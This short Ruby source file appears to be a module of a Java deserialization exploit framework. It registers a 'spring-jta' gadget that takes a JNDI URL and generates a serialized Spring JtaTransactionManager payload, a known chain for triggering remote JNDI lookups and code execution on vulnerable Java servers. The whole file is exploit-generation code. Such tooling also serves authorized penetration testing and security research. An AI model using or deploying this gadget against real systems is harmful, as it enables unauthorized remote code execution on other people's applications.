

require_relative '../payloads/spring'

class SpringJta < Java::Gadgets::Gadget
  def id
    'spring-jta'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('spring-jta')

    return false if params.fetch('jndiurl', nil).nil?

    true
  end

  def targets
    ['jndi']
  end

  def create(ctx, params: {})
    ctx.reg.load('model/spring-4.json')

    if !params.fetch('jndiurl', nil).nil?
      Java::Serialize::Payloads::Spring.make_jta(params['jndiurl'])
    else
      raise 'Missing parameters'
    end
  end
end

Java::Gadgets.register(
  SpringJta.new
)
